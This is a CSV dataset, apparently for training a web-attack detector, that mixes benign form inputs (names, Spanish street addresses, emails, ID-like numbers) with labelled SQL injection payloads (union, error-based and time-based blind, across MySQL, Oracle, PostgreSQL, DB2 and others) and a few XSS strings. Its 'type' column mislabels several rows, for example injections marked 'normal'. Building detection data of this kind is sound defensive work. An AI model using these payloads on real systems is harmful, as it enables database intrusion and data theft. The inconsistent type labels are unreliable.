Text,attack_type,Label,type
valverde de alcal,norm,0,normal
6753518387589503,norm,0,normal
"1"")) as rcse where 4559=4559 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",sqli,1,sql
hoel,norm,0,normal
re413t8208o,norm,0,normal
imperial 143,norm,0,normal
2759,norm,0,normal
raymona,norm,0,normal
suchet@ciaplast.tel,norm,0,normal
alcahazar,norm,0,normal
serene,norm,0,normal
2325,norm,0,normal
"-3638"" union all select 4394,4394,4394,4394,4394,4394,4394--",sqli,1,sql
calle alqueria de aznar 166,norm,0,normal
"1'+(select pdfv where 1172=1172 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161))+'",sqli,1,sql
1')) or (select * from (select(sleep(5)))sddo)#,sqli,1,sql
fleugel7,norm,0,normal
1%')) and 2006=2006,sqli,1,normal
iolaf,norm,0,normal
2615220846617019,norm,0,normal
tali,norm,0,normal
puntallana,norm,0,normal
keene3@irmedia.gm,norm,0,normal
"-2896')) as wisk where 1030=1030 union all select 1030,1030,1030,1030#",sqli,1,sql
avril,norm,0,normal
"1) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1,sql
us,norm,0,normal
"1%""))) or sleep(5)#",sqli,1,normal
34965589t,norm,0,normal
"1"" or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1,normal
"c/ corint, 13 11?a",norm,0,normal
-8143) union all select 3014--,sqli,1,sql
1)) or 6793=(select 6793 from pg_sleep(5)) and ((3069=3069,sqli,1,sql
loganiceo,norm,0,normal
"1%"")) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ((""%""=""",sqli,1,normal
"1"" procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1,normal
1') or sleep(5),sqli,1,normal
"1 where 2914=2914 union all select null,null,null#",sqli,1,sql
alabiada,norm,0,normal
luez.doskey@forohh.cf,norm,0,normal
fuente el olmo de fuentiduea,norm,0,normal
"sierra del gudar 98,",norm,0,normal
1281450288895094,norm,0,normal
03246946j,norm,0,normal
1'))) and 2006=2006,sqli,1,normal
"1%""));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ((""%""=""",sqli,1,sql
iorgo,norm,0,normal
"c/ pintor gomez cano 9, 10?e",norm,0,normal
"1'||(select 'qwoo' from dual where 8802=8802 or elt(6272=6272,sleep(5)))||'",sqli,1,sql
"1"" and 3824=benchmark(5000000,md5(0x76555642)) and ""tqbi""=""tqbi",sqli,1,normal
ma724-3ra,norm,0,normal
5538,norm,0,normal
"paseo pinos, 147",norm,0,normal
abagael,norm,0,normal
sayer@esbien.bi,norm,0,normal
e9951r3nte,norm,0,normal
9267680844011077,norm,0,normal
"-3282') union all select 9002,9002,9002,9002,9002#",sqli,1,sql
5he1un,norm,0,normal
mikel,norm,0,normal
"1%'))) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((('%'='",sqli,1,sql
1')) as kahn where 1361=1361 or (select * from (select(sleep(5)))sddo)#,sqli,1,sql
"calle san roque, 84,",norm,0,normal
"1) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",sqli,1,sql
promanar,norm,0,normal
2425,norm,0,normal
crislida,norm,0,normal
c4nt0rn,norm,0,normal
wilmont,norm,0,normal
3283,norm,0,normal
llasera,norm,0,normal
alpargatera,norm,0,normal
odieta,norm,0,normal
"1) where 6340=6340 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",sqli,1,sql
"1') and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",sqli,1,sql
"-5062""))) union all select 4125,4125--",sqli,1,sql
"almirante cruilles 19, 11?c",norm,0,normal
"1' or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and 'kdxg' like 'kdxg",sqli,1,sql
t0aspa70ble,norm,0,normal
a4go37a,norm,0,normal
-2300) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))),sqli,1,sql
1o11lo6,norm,0,normal
"1',iif(6625=6625,1,1/0)",sqli,1,normal
78532141k,norm,0,normal
abigar,norm,0,normal
"1%"";select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",sqli,1,sql
"1 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
castejon quiroga,norm,0,normal
montn,norm,0,normal
8un03a,norm,0,normal
"-8654' union all select 7190,7190,7190,7190,7190#",sqli,1,sql
"1'||(select 'ersu' where 4123=4123 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1,sql
2892,norm,0,normal
ca6oletero,norm,0,normal
"1%"") and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (""%""=""",sqli,1,sql
1) as xylu where 3338=3338 rlike (select * from (select(sleep(5)))sgvo)--,sqli,1,sql
"1%""));iif(7011=2522,1,1/0)",sqli,1,sql
1391785599222987,norm,0,normal
1' in boolean mode);select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,sqli,1,sql
"1"") and elt(4249=4249,7259) and (""xgka"" like ""xgka",sqli,1,normal
1'||(select 'npdx' from dual where 9486=9486 and sleep(5))||',sqli,1,sql
4u9_l5o,norm,0,normal
grifell brathwaite,norm,0,normal
cautela,norm,0,normal
"1') where 7646=7646 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
97573176t,norm,0,normal
"-1148"")) union all select 5442,5442,5442,5442#",sqli,1,sql
barsky,norm,0,normal
29807509s,norm,0,normal
soldati@legami.so,norm,0,normal
-1802' or 7931=5841--,sqli,1,sql
"1'+(select jxgx where 7446=7446 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
santa eulalia de gllego,norm,0,normal
"1'||(select 'yzdz' where 5021=5021;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
"""x` `<script>alert(1)</script>""` `>",xss,2,xss
87356578w,norm,0,normal
34481916v,norm,0,normal
"1"") as vzdq where 3160=3160;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
43896,norm,0,normal
"1%""));select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",sqli,1,sql
"1);select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (7711=7711",sqli,1,sql
"1%"")) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((""%""=""",sqli,1,sql
39513,norm,0,normal
ellul0,norm,0,normal
nicholls@devuelos.vu,norm,0,normal
abietceo,norm,0,normal
5829,norm,0,normal
"-9504%"")) or 8098=7472",sqli,1,normal
"1'))) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('gmvk' like 'gmvk",sqli,1,sql
edelmar,norm,0,normal
"1' in boolean mode) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)#",sqli,1,normal
"1%"") union all select null,null,null,null,null,null,null,null#",sqli,1,sql
24,norm,0,normal
-3849) or 5580=3442--,sqli,1,sql
savoula,norm,0,normal
"1"") as xylo where 2112=2112 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli,1,sql
7905893951677933,norm,0,normal
c/ guillen santacilla 94,norm,0,normal
"prats de rei, els",norm,0,normal
bravo murillo 18,norm,0,normal
1')) as rxxd where 5049=5049;select pg_sleep(5)--,sqli,1,sql
eduino,norm,0,normal
"1 and elt(3114=3114,sleep(5))#",sqli,1,normal
1)) as ogcv where 4396=4396;if(7899=7899) select 7899 else drop function zbbp--,sqli,1,sql
docken.carmi@soyrojo.so,norm,0,normal
cueva de montesinos 80 11-g,norm,0,normal
antonio urosa 89,norm,0,normal
12205405h,norm,0,normal
1'||(select 'goen' from dual where 8586=8586;select (case when (2132=8969) then 1 else 2132*(select 2132 from master..sysdatabases) end)--,sqli,1,sql
atanasio menendez s/n,norm,0,normal
"1"")) and sleep(5)#",sqli,1,normal
"-9997' union all select 9347,9347,9347,9347,9347,9347,9347,9347#",sqli,1,sql
"1') union all select null,null,null--",sqli,1,sql
almansa ingls,norm,0,normal
19,norm,0,normal
"1%""))) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (((""%""=""",sqli,1,sql
10332,norm,0,normal
sisante,norm,0,normal
miguel leon gracia 174,norm,0,normal
"agullana 65, 13?c",norm,0,normal
hervs bediaga,norm,0,normal
06640,norm,0,normal
moore@hotelesymas.ar,norm,0,normal
"1""))) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (((""oyxk""=""oyxk",sqli,1,sql
"1');iif(1157=4542,1,1/0)",sqli,1,sql
tarjetn,norm,0,normal
pis ramenghi,norm,0,normal
galimany bifet,norm,0,normal
"c/ padre francisco s/n,",norm,0,normal
"1""))) and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1,sql
"1"") as yggn where 1006=1006 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",sqli,1,sql
boimorto,norm,0,normal
c/ virgen del pilar 144,norm,0,normal
cao,norm,0,normal
"1"") as cnrh where 8524=8524 and 3824=benchmark(5000000,md5(0x76555642))--",sqli,1,sql
ope267s4ic4,norm,0,normal
lora,norm,0,normal
ezama ogaz,norm,0,normal
cagarria,norm,0,normal
15994230f,norm,0,normal
isolina,norm,0,normal
"1) as selm where 5759=5759;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
lugartenencia,norm,0,normal
1)) as bvij where 7913=7913;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,sqli,1,sql
"1)))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (((3950=3950",sqli,1,sql
"1%') and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ('%'='",sqli,1,sql
erich,norm,0,normal
1') as eyzk where 2489=2489 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,sqli,1,sql
09185484c,norm,0,normal
"1"") as fcrx where 2929=2929 and 2820=5133",sqli,1,normal
baquerizo amatll,norm,0,normal
"1"" and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)",sqli,1,sql
"calle bernardino valle y gracia, 177",norm,0,normal
escat monistca,norm,0,normal
hacanea,norm,0,normal
thala,norm,0,normal
01449036j,norm,0,normal
"paseo mokamer, s/n,",norm,0,normal
lluv8os4,norm,0,normal
legitimacin,norm,0,normal
6821418764083161,norm,0,normal
lukers,norm,0,normal
odelsia,norm,0,normal
rio esgueva 57 1?g,norm,0,normal
"1'));select count(*) from generate_series(1,5000000) and (('hxcq'='hxcq",sqli,1,sql
45210940r,norm,0,normal
"c/ san blas 88,",norm,0,normal
"1"" and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ""okpa""=""okpa",sqli,1,sql
boes@cumbareback.kz,norm,0,normal
vial,norm,0,normal
"-3587') or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('psqt' like 'psqt",sqli,1,sql
"1' in boolean mode) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))#",sqli,1,sql
irureta kosiner,norm,0,normal
"1') or 8421=(select count(*) from generate_series(1,5000000)) and ('obmu'='obmu",sqli,1,sql
toddi,norm,0,normal
"1) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
40979614p,norm,0,normal
"-4694%""))) union all select 9178,9178,9178,9178,9178--",sqli,1,sql
fitzmahony-mcgraw@fotoseroticas.com.hk,norm,0,normal
patterso,norm,0,normal
"1"") where 2839=2839 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
olvan,norm,0,normal
"-3283) where 1948=1948 union all select 1948,1948,1948#",sqli,1,sql
malanquilla,norm,0,normal
8916,norm,0,normal
pasealekua manuel lardizabal 105 6d,norm,0,normal
bailina quijad,norm,0,normal
"-4230""))) union all select 6962,6962,6962,6962,6962,6962#",sqli,1,sql
"1 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)-- btqa",sqli,1,sql
"1"")) or (select * from (select(sleep(5)))ydpu) and ((""knbx""=""knbx",sqli,1,sql
soria,norm,0,normal
"1%')) and 3824=benchmark(5000000,md5(0x76555642)) and (('%'='",sqli,1,normal
1 where 1015=1015;select pg_sleep(5)--,sqli,1,sql
g!arbn,norm,0,normal
jana,norm,0,normal
7745667684469889,norm,0,normal
cualedro,norm,0,normal
llompart maydana,norm,0,normal
"1%') and make_set(1458=3902,3902) and ('%'='",sqli,1,normal
"<img id=xss src=""jav ascript:alert('xss');"">",xss,2,sql
bonilla balac,norm,0,normal
calle parque del huecar 75 6?a,norm,0,normal
3somera,norm,0,normal
pertusa boladera,norm,0,normal
1%';select (case when (3677=2193) then 3677 else 1/(select 0) end)--,sqli,1,sql
"1')) as rxhe where 3838=3838 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
"-6085 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",sqli,1,sql
-4906'))) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((('pkrq'='pkrq,sqli,1,sql
0106705329803127,norm,0,normal
"<div id=xss style=""width: expression(alert('xss'));"">",xss,2,sql
tromen,norm,0,normal
recordar,norm,0,normal
1') and (select * from (select(sleep(5)))fzno) and ('mqoj' like 'mqoj,sqli,1,sql
matsumiya stuyck,norm,0,normal
hortensia,norm,0,normal
1%')) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (('%'=',sqli,1,sql
huston,norm,0,normal
casa de la misericordia 12,norm,0,normal
"espartero, 103, 5-f",norm,0,normal
"1%') union all select null,null,null,null#",sqli,1,sql
9152015554982082,norm,0,normal
"-7743"" or 9323=9323#",sqli,1,normal
"1') where 2090=2090;select count(*) from generate_series(1,5000000)--",sqli,1,sql
gaianes,norm,0,normal
"1"" and 8407=(select count(*) from generate_series(1,5000000)) and ""zwov""=""zwov",sqli,1,sql
"-2852%') or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
cadrete,norm,0,normal
1'))) and 6969=(select 6969 from pg_sleep(5)) and ((('qrtf'='qrtf,sqli,1,sql
calb fermoselle,norm,0,normal
70129758k,norm,0,normal
"1%"") or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (""%""=""",sqli,1,normal
epnimo,norm,0,normal
dehr,norm,0,normal
4691061032427917,norm,0,normal
transki,norm,0,normal
7009,norm,0,normal
85802086b,norm,0,normal
"1%""))) union all select null,null--",sqli,1,sql
rollie,norm,0,normal
0945394059491882,norm,0,normal
"1%"")) and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,1,normal
verdusco,norm,0,normal
"1"")(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (""xhqc""=""xhqc",sqli,1,sql
"1'))) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ((('eugs'='eugs",sqli,1,sql
medina-sidonia,norm,0,normal
oviedo,norm,0,normal
jackelyn,norm,0,normal
11539856c,norm,0,normal
"-7345%"" or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""%""=""",sqli,1,sql
machiavello bordones,norm,0,normal
alverta,norm,0,normal
v1itu1llar,norm,0,normal
seyler@miami-beach.gw,norm,0,normal
1%'))) or sleep(5) and ((('%'=',sqli,1,normal
"1'))) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('isyg'='isyg",sqli,1,normal
-6912' in boolean mode) union all select 6012--,sqli,1,sql
8888,norm,0,normal
amors de arriba,norm,0,normal
garda,norm,0,normal
"espluga calba, l'",norm,0,normal
corbo gornes,norm,0,normal
46725,norm,0,normal
co8cub3na,norm,0,normal
1) and sleep(5),sqli,1,normal
"-6554'))) union all select 4384,4384,4384,4384,4384#",sqli,1,sql
selj@ebaz.travel,norm,0,normal
17743,norm,0,normal
praxis,norm,0,normal
"1""))) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (((""rtzn""=""rtzn",sqli,1,normal
"marcos redondo 151, 10?b",norm,0,normal
35is117r,norm,0,normal
"los halcones 160,",norm,0,normal
genciano,norm,0,normal
"1%""));(select * from (select(sleep(5)))srmq) and ((""%""=""",sqli,1,sql
m7866,norm,0,normal
0699224881613700,norm,0,normal
masashi,norm,0,normal
"1%') procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ('%'='",sqli,1,normal
"1"") as idwa where 2545=2545 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
"1"") as vqkz where 8536=8536;begin user_lock.sleep(5); end--",sqli,1,sql
4522,norm,0,normal
"-1600%""))) or elt(4568=7693,7693) and (((""%""=""",sqli,1,normal
1'));begin dbms_lock.sleep(5); end and (('zeyr'='zeyr,sqli,1,sql
1) and (2342=3620)*3620,sqli,1,normal
4ode5ista,norm,0,normal
7677,norm,0,normal
32452,norm,0,normal
-2100' where 9260=9260 or 3038=3038,sqli,1,normal
-7319 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)),sqli,1,sql
"plaa tarent, 117, 2-h",norm,0,normal
"-5761"") or 3762=1274",sqli,1,normal
aguilar de bureba,norm,0,normal
-1252') or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('pzxh' like 'pzxh,sqli,1,sql
1138illo,norm,0,normal
monturi,norm,0,normal
retr8t2,norm,0,normal
"1') where 6248=6248 and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,1,normal
winnipeg,norm,0,normal
"1'))) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ((('cfhi' like 'cfhi",sqli,1,sql
novillas,norm,0,normal
"-6254"" where 8941=8941 or elt(1032=1032,3623)--",sqli,1,sql
proftica,norm,0,normal
1)) as dhqt where 8485=8485 waitfor delay '0:0:5'--,sqli,1,sql
ca26lot9,norm,0,normal
once s/n,norm,0,normal
1)) as ojjk where 3687=3687 and (4833=9218)*9218--,sqli,1,sql
matlin@carrillo-de-albornoz.be,norm,0,normal
"iif(1539=1539,1539,1/0)",sqli,1,normal
-7277))) order by 1#,sqli,1,normal
torrente zaldvar,norm,0,normal
ceciley,norm,0,normal
"1%"")) or 8466=benchmark(5000000,md5(0x694a4745)) and ((""%""=""",sqli,1,normal
47529,norm,0,normal
"1%"");call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1,sql
"1%"") or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (""%""=""",sqli,1,sql
imparato.inch@flexinspect.tc,norm,0,normal
mediavilla buera,norm,0,normal
dina,norm,0,normal
dlar,norm,0,normal
60996626m,norm,0,normal
oziel,norm,0,normal
revellinos,norm,0,normal
samardzic.carafotes@bruoseguridad.je,norm,0,normal
0659755476152636,norm,0,normal
recur23bl6,norm,0,normal
zeng,norm,0,normal
"-5625"" union all select 6087,6087,6087,6087,6087,6087--",sqli,1,sql
cristo,norm,0,normal
"-1863') or make_set(9354=9354,7185) and ('whwv'='whwv",sqli,1,normal
"1"") or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (""rwlq""=""rwlq",sqli,1,sql
"1"") as jtou where 8129=8129 and 7533=7533--",sqli,1,sql
"1)));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
cervi fornas,norm,0,normal
jared,norm,0,normal
"1 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
3234011820759237,norm,0,normal
baides,norm,0,normal
1'))) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('cgiu'='cgiu,sqli,1,sql
"1"");select case when 7717=7717 then 1 else null end--",sqli,1,sql
tadeas4,norm,0,normal
7367769822480051,norm,0,normal
"1' in boolean mode) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)#",sqli,1,normal
-2733'))) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((('btjx'='btjx,sqli,1,sql
"1'+(select bruk where 1400=1400 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1))+'",sqli,1,sql
"<img id=xss src=javascript:alert(""xss"")>"";' >",xss,2,xss
"-1434')) union all select 4734,4734,4734,4734,4734,4734,4734,4734,4734,4734#",sqli,1,sql
57649963a,norm,0,normal
pche,norm,0,normal
-2036') or (8459=8459)*4906 and ('hjeu'='hjeu,sqli,1,normal
-1190' or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and 'yxry' like 'yxry,sqli,1,sql
"1' or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)",sqli,1,normal
godayol iafrate,norm,0,normal
f1581il2ente,norm,0,normal
"1')) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (('dhwt'='dhwt",sqli,1,sql
1 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')-- izad,sqli,1,sql
trvago,norm,0,normal
"1%')) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (('%'='",sqli,1,sql
marineau,norm,0,normal
66750565b,norm,0,normal
rix,norm,0,normal
ashla,norm,0,normal
"-5478"") where 4100=4100 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,1,sql
fit irizibar,norm,0,normal
"1"") and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""rrbl""=""rrbl",sqli,1,sql
dalmira,norm,0,normal
"-1628"" union all select 9189,9189,9189,9189,9189,9189,9189,9189,9189--",sqli,1,sql
petrie3@menorca.com.kp,norm,0,normal
-5356') or 9323=9323#,sqli,1,normal
brace4@velazquezlarraaga.kz,norm,0,normal
37655511a,norm,0,normal
noami,norm,0,normal
02129,norm,0,normal
monimiceo,norm,0,normal
gangotra,norm,0,normal
"1%')) union all select null,null,null#",sqli,1,sql
shahir,norm,0,normal
9845728819454113,norm,0,normal
serville9,norm,0,normal
3182733189788703,norm,0,normal
rexach donada,norm,0,normal
"terque 135, 7-c",norm,0,normal
"-1<body background=""javascript:document.cookie=true;"">",xss,2,xss
carrer puigmercadal 33 5h,norm,0,normal
kneeshaw,norm,0,normal
peraltar,norm,0,normal
1418,norm,0,normal
latella,norm,0,normal
8990907975781927,norm,0,normal
"1) and elt(1210=1210,sleep(5))",sqli,1,normal
"1"") where 1614=1614 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--",sqli,1,sql
sotorro feo,norm,0,normal
pearce,norm,0,normal
burstein@g-audio.ee,norm,0,normal
1677,norm,0,normal
1)) as hxtp where 5478=5478 and 8594=(select 8594 from pg_sleep(5))--,sqli,1,sql
1 and 7533=7533# absp,sqli,1,normal
"1"" where 4684=4684 union all select null,null,null,null#",sqli,1,sql
pizorno talarn,norm,0,normal
bestard,norm,0,normal
29380,norm,0,normal
"c/ cerro, 87 2?b",norm,0,normal
"1'))) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((('odkr'='odkr",sqli,1,sql
santilln dennett,norm,0,normal
